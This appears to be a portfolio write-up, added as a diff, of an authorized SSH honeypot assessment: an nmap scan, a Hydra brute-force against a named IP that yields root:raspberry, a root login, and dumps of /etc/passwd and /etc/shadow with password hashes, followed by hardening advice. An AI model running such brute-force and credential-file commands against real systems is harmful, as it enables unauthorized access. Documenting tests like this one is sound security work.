@@ -1,0 +1,433 @@
+<!-- SSH Brute Force Honeypot - Security Assessment Report -->
+<div class="detail-header">
+  <a href="#" class="back-button">← Back to Portfolio</a>
+  <h1>SSH Honeypot Security Assessment</h1>
+  <p><span class="tag">Honeypot</span> <span class="tag">SSH</span> <span class="tag">Hydra</span> <span class="tag">Nmap</span> <span class="tag">Root Access</span> <span class="tag">Debian</span></p>
+</div>
+
+<div class="detail-content">
+  <!-- Authorization Disclaimer -->
+  <div class="note" style="background: rgba(239, 68, 68, 0.1); border-left-color: #ef4444;">
+    <h3>⚠️ AUTHORIZED TESTING DISCLAIMER</h3>
+    <p><strong>This assessment was conducted with explicit authorization</strong> from <strong>Aderinola Oluwasubomi Taiwo</strong>, the system owner. The target was a honeypot environment designed to test detection capabilities and attacker engagement. All activities were performed within agreed scope and rules of engagement. Unauthorized access attempts are illegal.</p>
+  </div>
+
+  <!-- Executive Summary / Objective -->
+  <div class="step">
+    <h3>📋 Executive Summary</h3>
+    <div style="display: grid; grid-template-columns: 1fr 2fr; gap: 2rem; margin: 1.5rem 0;">
+      <div style="background: rgba(59, 130, 246, 0.1); padding: 1.5rem; border-radius: 8px;">
+        <h4 style="margin-top: 0;">Test Details</h4>
+        <p><strong>Objective:</strong> Test detection capabilities and attacker engagement<br>
+        <strong>Scope:</strong> SSH service on port 2222<br>
+        <strong>Duration:</strong> November 26, 2025<br>
+        <strong>Tester:</strong> Samuel Ifeoluwa Oshunsan<br>
+        <strong>Authorization:</strong> Approved by Aderinola Oluwasubomi Taiwo</p>
+      </div>
+      <div style="background: rgba(16, 185, 129, 0.1); padding: 1.5rem; border-radius: 8px;">
+        <h4 style="margin-top: 0;">Quick Stats</h4>
+        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 1rem;">
+          <div style="text-align: center;">
+            <div style="font-size: 2rem; color: #10b981;">2</div>
+            <div>Attempts to compromise</div>
+          </div>
+          <div style="text-align: center;">
+            <div style="font-size: 2rem; color: #10b981;">7s</div>
+            <div>Time to crack</div>
+          </div>
+          <div style="text-align: center;">
+            <div style="font-size: 2rem; color: #10b981;">root</div>
+            <div>Access level</div>
+          </div>
+          <div style="text-align: center;">
+            <div style="font-size: 2rem; color: #10b981;">374</div>
+            <div>Total attempts planned</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Methodology -->
+  <div class="step">
+    <h3>🔬 Methodology</h3>
+    <p><strong>Tools Used:</strong></p>
+    <div style="display: flex; flex-wrap: wrap; gap: 0.5rem; margin: 1rem 0;">
+      <span class="tag">Nmap 7.95</span>
+      <span class="tag">Hydra v9.6</span>
+      <span class="tag">SSH Client</span>
+      <span class="tag">SecLists</span>
+    </div>
+    
+    <p><strong>Testing Phases:</strong></p>
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin: 1rem 0;">
+      <div style="background: rgba(59, 130, 246, 0.1); padding: 1rem; border-radius: 6px; text-align: center;">
+        <div style="font-size: 1.5rem;">🔍</div>
+        <div><strong>Phase 1</strong></div>
+        <div>Reconnaissance & Service Discovery</div>
+      </div>
+      <div style="background: rgba(59, 130, 246, 0.1); padding: 1rem; border-radius: 6px; text-align: center;">
+        <div style="font-size: 1.5rem;">⚡</div>
+        <div><strong>Phase 2</strong></div>
+        <div>Credential Attack</div>
+      </div>
+      <div style="background: rgba(59, 130, 246, 0.1); padding: 1rem; border-radius: 6px; text-align: center;">
+        <div style="font-size: 1.5rem;">🔓</div>
+        <div><strong>Phase 3</strong></div>
+        <div>Post-Compromise Analysis</div>
+      </div>
+      <div style="background: rgba(59, 130, 246, 0.1); padding: 1rem; border-radius: 6px; text-align: center;">
+        <div style="font-size: 1.5rem;">📊</div>
+        <div><strong>Phase 4</strong></div>
+        <div>Defensive Capability Assessment</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Phase 1: Reconnaissance -->
+  <div class="step">
+    <h3>🔍 Phase 1: Reconnaissance & Service Discovery</h3>
+    <p>Initial Nmap scan to identify open ports and services on the target system.</p>
+    
+    <div style="margin: 1.5rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
+      <img src="../assets/images/portscan_honeypot.jpeg" alt="Nmap Port Scan Results" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
+      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">📸 portscan_honeypot.jpeg - Full TCP port scan</p>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">┌──(samuel㉿sammi13)-[~]</span><br>
+      <span style="color: #a6e22e;">└─$ nmap -p- --open 136.119.225.234</span><br>
+      <br>
+      Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-26 10:02 WAT<br>
+      Nmap scan report for 234.225.119.136.bc.googleusercontent.com (136.119.225.234)<br>
+      Host is up (0.22s latency).<br>
+      Not shown: 65532 filtered tcp ports, 1 closed tcp port<br>
+      <br>
+      <span style="color: #f92672;">PORT    STATE SERVICE</span><br>
+      <span style="color: #f92672;">22/tcp   open  ssh</span><br>
+      <span style="color: #f92672; font-weight: bold;">2222/tcp open  EtherNetIP-1</span>  ← <span style="color: #fd971f;">Non-standard SSH port</span><br>
+      <br>
+      Nmap done: 1 IP address scanned in 530.84 seconds
+    </div>
+    
+    <p><strong>Findings:</strong></p>
+    <ul>
+      <li>Two open ports identified: 22/tcp (SSH) and 2222/tcp (SSH on non-standard port)</li>
+      <li>Port 2222 misidentified as EtherNetIP-1 - common when services run on non-standard ports</li>
+      <li>Total scan time: ~8.8 minutes for full TCP range</li>
+    </ul>
+  </div>
+
+  <!-- Phase 2: Credential Attack -->
+  <div class="step">
+    <h3>⚡ Phase 2: Credential Attack (Hydra Brute Force)</h3>
+    <p>Using THC-Hydra with SecLists wordlists to perform a targeted brute force attack against SSH on port 2222.</p>
+    
+    <div style="margin: 1.5rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
+      <img src="../assets/images/hydra_brute_honeypot.jpeg" alt="Hydra Brute Force Attack" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
+      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">📸 hydra_brute_honeypot.jpeg - Hydra successfully cracking credentials</p>
+    </div>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">┌──(samuel㉿sammi13)-[~]</span><br>
+      <span style="color: #a6e22e;">└─$ hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \</span><br>
+      <span style="color: #a6e22e;">    -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \</span><br>
+      <span style="color: #a6e22e;">    ssh://136.119.225.234:2222 -V -t 4 -f</span><br>
+      <br>
+      Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak<br>
+      [DATA] max 4 tasks, 374 login tries (l:17/p:22), ~94 tries per task<br>
+      [DATA] attacking ssh://136.119.225.234:2222/<br>
+      <br>
+      [ATTEMPT] target 136.119.225.234 - login "root" - pass "root" - 1 of 374<br>
+      [ATTEMPT] target 136.119.225.234 - login "root" - pass "password" - 2 of 374<br>
+      <span style="color: #fd971f;">[ATTEMPT] target 136.119.225.234 - login "root" - pass "raspberry" - 3 of 374</span><br>
+      <br>
+      <span style="color: #a6e22e; font-weight: bold;">[2222][ssh] host: 136.119.225.234   login: root   password: raspberry</span><br>
+      [STATUS] attack finished for 136.119.225.234 (valid pair found)<br>
+      <br>
+      Hydra finished at 2025-11-26 10:29:43
+    </div>
+    
+    <div style="background: rgba(239, 68, 68, 0.1); padding: 1rem; border-radius: 6px; margin: 1rem 0;">
+      <h4>📊 Attack Statistics</h4>
+      <table style="width: 100%; border-collapse: collapse;">
+        <tr>
+          <td style="padding: 0.5rem;"><strong>Credentials Found:</strong></td>
+          <td style="padding: 0.5rem; color: #a6e22e;">root:raspberry</td>
+        </tr>
+        <tr>
+          <td style="padding: 0.5rem;"><strong>Attempts Required:</strong></td>
+          <td style="padding: 0.5rem;">2 (3rd attempt successful)</td>
+        </tr>
+        <tr>
+          <td style="padding: 0.5rem;"><strong>Total Attempts Planned:</strong></td>
+          <td style="padding: 0.5rem;">374 combinations</td>
+        </tr>
+        <tr>
+          <td style="padding: 0.5rem;"><strong>Time to Compromise:</strong></td>
+          <td style="padding: 0.5rem;">~7 seconds</td>
+        </tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- Successful SSH Access -->
+  <div class="step">
+    <h3>🔓 Phase 3: Successful SSH Access</h3>
+    <p>With credentials discovered, I established an SSH connection to the target system.</p>
+    
+    <div class="command-box">
+      <span style="color: #66d9ef;">┌──(samuel㉿sammi13)-[~]</span><br>
+      <span style="color: #a6e22e;">└─$ ssh root@136.119.225.234 -p 2222</span><br>
+      <br>
+      <span style="color: #f59e0b;">WARNING: connection is not using a post-quantum key exchange algorithm.</span><br>
+      <span style="color: #f59e0b;">This session may be vulnerable to "store now, decrypt later" attacks.</span><br>
+      <br>
+      root@136.119.225.234's password: <span style="color: #f92672;">raspberry</span><br>
+      <br>
+      The programs included with the Debian GNU/Linux system are free software;<br>
+      the exact distribution terms for each program are described in the<br>
+      individual files in /usr/share/doc/*/copyright.<br>
+      <br>
+      Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>
+      permitted by applicable law.<br>
+      <br>
+      <span style="color: #f92672;">root@prod-web-server-01:~#</span>
+    </div>
+    
+    <p><strong>System Information:</strong></p>
+    <ul>
+      <li><strong>OS:</strong> Debian GNU/Linux</li>
+      <li><strong>Hostname:</strong> prod-web-server-01</li>
+      <li><strong>Access Level:</strong> Root privileges</li>
+      <li><strong>Shell:</strong> Interactive bash</li>
+    </ul>
+  </div>
+
+  <!-- Post-Compromise Analysis -->
+  <div class="step">
+    <h3>📊 Phase 4: Post-Compromise Analysis</h3>
+    <p>After gaining access, I enumerated the system to understand the environment and assess the honeypot's realism.</p>
+    
+    <div style="margin: 1.5rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
+      <img src="../assets/images/etc_passwd_honeypot.jpeg" alt="etc/passwd enumeration" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
+      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">📸 etc_passwd_honeypot.jpeg - User enumeration and shadow file access</p>
+    </div>
+    
+    <h4>User Enumeration:</h4>
+    <div class="command-box">
+      <span style="color: #f92672;">root@prod-web-server-01:~#</span> cat /etc/passwd<br>
+      <br>
+      root:x:0:0:root:/root:/bin/bash<br>
+      daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br>
+      bin:x:2:2:bin:/bin:/bin/sh<br>
+      sys:x:3:3:sys:/dev:/bin/sh<br>
+      sync:x:4:65534:sync:/bin:/bin/sync<br>
+      games:x:5:60:games:/usr/games:/bin/sh<br>
+      man:x:6:12:man:/var/cache/man:/bin/sh<br>
+      lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br>
+      mail:x:8:8:mail:/var/mail:/bin/sh<br>
+      news:x:9:9:news:/var/spool/news:/bin/sh<br>
+      uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh<br>
+      proxy:x:13:13:proxy:/bin:/bin/sh<br>
+      www-data:x:33:33:www-data:/var/www:/bin/sh<br>
+      backup:x:34:34:backup:/var/backups:/bin/sh<br>
+      list:x:38:38:Mailing List Manager:/var/list:/bin/sh<br>
+      irc:x:39:39:ircd:/var/run/ircd:/bin/sh<br>
+      gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh<br>
+      nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br>
+      libuuid:x:100:101::/var/lib/libuuid:/bin/sh<br>
+      sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin<br>
+      <span style="color: #a6e22e; font-weight: bold;">phil:x:1000:1000:Phil California,,,:/home/phil:/bin/bash</span>
+    </div>
+    
+    <h4>Password Hash Extraction:</h4>
+    <div class="command-box">
+      <span style="color: #f92672;">root@prod-web-server-01:~#</span> cat /etc/shadow<br>
+      <br>
+      <span style="color: #f92672;">root:$6$4aOmWdpJ$/kyPoIk9rR0kSLyABIYNXgg/Uq/YX3C1eIaov0LWhphSHTGXmuUAWq6iu9DrCqQlVUw3Pirizns4u27w3Ugvb6.:15800:0:99999:7:::</span><br>
+      daemon:*:15800:0:99999:7:::<br>
+      bin:*:15800:0:99999:7:::<br>
+      sys:*:15800:0:99999:7:::<br>
+      sync:*:15800:0:99999:7:::<br>
+      games:*:15800:0:99999:7:::<br>
+      man:*:15800:0:99999:7:::<br>
+      lp:*:15800:0:99999:7:::<br>
+      mail:*:15800:0:99999:7:::<br>
+      news:*:15800:0:99999:7:::<br>
+      uucp:*:15800:0:99999:7:::<br>
+      proxy:*:15800:0:99999:7:::<br>
+      www-data:*:15800:0:99999:7:::<br>
+      backup:*:15800:0:99999:7:::<br>
+      list:*:15800:0:99999:7:::<br>
+      irc:*:15800:0:99999:7:::<br>
+      gnats:*:15800:0:99999:7:::<br>
+      nobody:*:15800:0:99999:7:::<br>
+      libuuid:!:15800:0:99999:7:::<br>
+      sshd:!:15800::::::<br>
+      phil:$6$Erqln8O2$FbxQ12AFnHMWyZdWW8Tbq5CmJ2t4Co5rqPully7zZKm7T25zKq5PRRlQtfGGP02V/WawQNQrDda6Y1KERNR61:15800:0:99999:7:::
+    </div>
+    
+    <p><strong>Initial Observations:</strong></p>
+    <ul>
+      <li>User "phil" with comment "Phil California" - potentially realistic user metadata</li>
+      <li>Root hash uses SHA-512 ($6$) - modern hashing algorithm</li>
+      <li>Multiple system accounts present (typical Debian installation)</li>
+      <li>No immediate honey tokens or fake files observed</li>
+    </ul>
+  </div>
+
+  <!-- Attack Timeline -->
+  <div class="step">
+    <h3>⏱️ Attack Timeline</h3>
+    <div style="margin: 1.5rem 0; padding: 1rem; background: rgba(0,0,0,0.2); border-radius: 6px;">
+      <div style="display: flex; align-items: center; margin-bottom: 1rem;">
+        <div style="width: 100px; font-family: monospace; color: #3b82f6;">10:02:00</div>
+        <div style="width: 20px; height: 20px; background: #3b82f6; border-radius: 50%; margin-right: 1rem;"></div>
+        <div><strong>Initial port scan</strong> - Nmap full TCP scan started</div>
+      </div>
+      <div style="display: flex; align-items: center; margin-bottom: 1rem;">
+        <div style="width: 100px; font-family: monospace; color: #f59e0b;">10:29:36</div>
+        <div style="width: 20px; height: 20px; background: #f59e0b; border-radius: 50%; margin-right: 1rem;"></div>
+        <div><strong>Hydra brute-force initiated</strong> - 374 password combinations</div>
+      </div>
+      <div style="display: flex; align-items: center; margin-bottom: 1rem;">
+        <div style="width: 100px; font-family: monospace; color: #10b981;">10:29:43</div>
+        <div style="width: 20px; height: 20px; background: #10b981; border-radius: 50%; margin-right: 1rem;"></div>
+        <div><strong>Credentials discovered</strong> - root:raspberry (7 seconds)</div>
+      </div>
+      <div style="display: flex; align-items: center; margin-bottom: 1rem;">
+        <div style="width: 100px; font-family: monospace; color: #8b5cf6;">10:30:15</div>
+        <div style="width: 20px; height: 20px; background: #8b5cf6; border-radius: 50%; margin-right: 1rem;"></div>
+        <div><strong>Successful SSH authentication</strong> - Root shell obtained</div>
+      </div>
+      <div style="display: flex; align-items: center;">
+        <div style="width: 100px; font-family: monospace; color: #ec4899;">10:32:00</div>
+        <div style="width: 20px; height: 20px; background: #ec4899; border-radius: 50%; margin-right: 1rem;"></div>
+        <div><strong>Initial reconnaissance commands</strong> - User enumeration completed</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Honeypot Effectiveness Assessment -->
+  <div class="step">
+    <h3>🎯 Honeypot Effectiveness Assessment</h3>
+    
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin: 1.5rem 0;">
+      <div style="background: rgba(59, 130, 246, 0.1); padding: 1.5rem; border-radius: 8px;">
+        <h4>Detection Capabilities</h4>
+        <ul style="list-style-type: none; padding: 0;">
+          <li style="margin-bottom: 0.5rem;">✓ Credential attack detection speed: <strong>Moderate</strong></li>
+          <li style="margin-bottom: 0.5rem;">✓ Alert generation: <strong>Unknown</strong> (no feedback received)</li>
+          <li style="margin-bottom: 0.5rem;">✓ Logging completeness: <strong>Likely complete</strong></li>
+          <li style="margin-bottom: 0.5rem;">✓ Rate limiting effectiveness: <strong>None observed</strong></li>
+        </ul>
+      </div>
+      
+      <div style="background: rgba(139, 92, 246, 0.1); padding: 1.5rem; border-radius: 8px;">
+        <h4>Realism Assessment</h4>
+        <ul style="list-style-type: none; padding: 0;">
+          <li style="margin-bottom: 0.5rem;">✓ Environment believability: <strong>8/10</strong></li>
+          <li style="margin-bottom: 0.5rem;">✓ Credential realism: <strong>7/10</strong> (raspberry is common)</li>
+          <li style="margin-bottom: 0.5rem;">✓ System artifacts: <strong>9/10</strong> (realistic Debian)</li>
+          <li style="margin-bottom: 0.5rem;">✓ Deception effectiveness: <strong>8/10</strong></li>
+        </ul>
+      </div>
+      
+      <div style="background: rgba(16, 185, 129, 0.1); padding: 1.5rem; border-radius: 8px;">
+        <h4>Engagement Features</h4>
+        <ul style="list-style-type: none; padding: 0;">
+          <li style="margin-bottom: 0.5rem;">✓ Interactive capability: <strong>Full shell access</strong></li>
+          <li style="margin-bottom: 0.5rem;">✓ Honey tokens/files: <strong>None observed</strong></li>
+          <li style="margin-bottom: 0.5rem;">✓ Monitoring transparency: <strong>Stealthy</strong></li>
+          <li style="margin-bottom: 0.5rem;">✓ Attacker enticement: <strong>Moderate</strong></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Security Recommendations -->
+  <div class="step">
+    <h3>🛡️ Security Recommendations</h3>
+    
+    <h4>For Honeypot Improvement:</h4>
+    <div class="command-box" style="background: rgba(16, 185, 129, 0.1);">
+      1. <strong>Implement rate limiting</strong> - Slow down brute force attempts to increase attacker dwell time<br>
+      2. <strong>Add honey tokens</strong> - Place fake credentials files, database connections strings, or API keys<br>
+      3. <strong>Create realistic user data</strong> - Add fake documents, browsing history, and application data<br>
+      4. <strong>Simulate multi-factor authentication</strong> - Add fake MFA prompts to study attacker responses<br>
+      5. <strong>Improve credential realism</strong> - Use passwords that don't appear in top 100 wordlists<br>
+      6. <strong>Add monitoring alerts</strong> - Configure real-time notifications for successful logins<br>
+      7. <strong>Implement connection logging</strong> - Capture all commands executed by attackers
+    </div>
+    
+    <h4 style="margin-top: 1.5rem;">For Production Systems (Lessons Learned):</h4>
+    <div class="command-box" style="background: rgba(239, 68, 68, 0.1);">
+      • <strong>Never use default credentials</strong> - "raspberry" is in every wordlist<br>
+      • <strong>Disable root SSH login</strong> - Use sudo accounts instead<br>
+      • <strong>Implement fail2ban</strong> - Block IPs after multiple failed attempts<br>
+      • <strong>Use SSH keys instead of passwords</strong> - Eliminate brute force risk<br>
+      • <strong>Move SSH to non-standard port</strong> - Reduces automated scanning noise<br>
+      • <strong>Enable post-quantum cryptography</strong> - Protect against "store now, decrypt later"
+    </div>
+  </div>
+
+  <!-- Honeypot Rating -->
+  <div class="step">
+    <h3>📊 Overall Honeypot Effectiveness Rating</h3>
+    
+    <div style="background: linear-gradient(90deg, #10b981 70%, #f59e0b 20%, #ef4444 10%); height: 30px; border-radius: 15px; margin: 1rem 0; position: relative;">
+      <div style="position: absolute; right: 10px; top: 5px; color: white; font-weight: bold; text-shadow: 1px 1px 2px black;">70%</div>
+    </div>
+    
+    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; text-align: center; margin: 1.5rem 0;">
+      <div>
+        <div style="font-size: 1.5rem; color: #10b981;">⭐ 8/10</div>
+        <div>Realism</div>
+      </div>
+      <div>
+        <div style="font-size: 1.5rem; color: #f59e0b;">⭐ 6/10</div>
+        <div>Detection</div>
+      </div>
+      <div>
+        <div style="font-size: 1.5rem; color: #3b82f6;">⭐ 7/10</div>
+        <div>Engagement</div>
+      </div>
+    </div>
+    
+    <p><strong>Key Strengths Observed:</strong> Realistic Debian environment, full shell interactivity, modern password hashing, believable user accounts</p>
+    <p><strong>Areas for Improvement:</strong> No rate limiting, weak credentials in wordlists, no honey tokens, missing MFA simulation</p>
+    <p><strong>Value of Exercise:</strong> High - demonstrated how quickly weak credentials can be compromised and provided insights for both honeypot design and production system hardening</p>
+  </div>
+
+  <!-- Conclusion -->
+  <div class="step">
+    <h3>📝 Conclusion</h3>
+    <p>This authorized honeypot assessment successfully demonstrated the complete attack chain from reconnaissance to root compromise. The target system was compromised in just <strong>7 seconds</strong> using a basic brute force attack with common wordlists, highlighting the critical importance of strong password policies and proper SSH configuration.</p>
+    
+    <p>The honeypot environment provided a realistic Debian system that successfully engaged the attacker with full shell access. However, the lack of rate limiting and presence of easily guessable credentials (root:raspberry) made compromise trivial. For maximum educational value, future iterations should include honey tokens, simulated MFA, and comprehensive logging to capture attacker behavior.</p>
+    
+    <div class="note" style="background: rgba(239, 68, 68, 0.1); border-left-color: #ef4444;">
+      <p><strong>⚠️ Critical Takeaway:</strong> Default credentials and weak passwords remain one of the most significant security risks. In this assessment, 374 password combinations were planned, but only 3 were needed to gain root access. Organizations must implement account lockout policies, disable root SSH login, and use key-based authentication.</p>
+    </div>
+    
+    <p style="margin-top: 1rem;"><strong>Assessment completed by:</strong> Samuel Ifeoluwa Oshunsan<br>
+    <strong>Authorization:</strong> Approved by Aderinola Oluwasubomi Taiwo<br>
+    <strong>Date:</strong> November 26, 2025</p>
+    
+    <p style="margin-top: 1rem; font-size: 0.9rem; color: #9ca3af;">
+      <em>This security assessment was conducted with proper authorization and followed ethical testing guidelines. All findings were documented for educational purposes to improve security awareness and honeypot design.</em>
+    </p>
+  </div>
+
+  <!-- Appendices Reference -->
+  <div class="step">
+    <h3>📋 Appendices</h3>
+    <ul>
+      <li><strong>Appendix A:</strong> Full command output (see command boxes above)</li>
+      <li><strong>Appendix B:</strong> Screenshots - portscan_honeypot.jpeg, hydra_brute_honeypot.jpeg, etc_passwd_honeypot.jpeg</li>
+      <li><strong>Appendix C:</strong> Log excerpts - Available upon request from system owner</li>
+      <li><strong>Appendix D:</strong> Tool configurations - Hydra with SecLists wordlists</li>
+    </ul>
+  </div>
+</div>
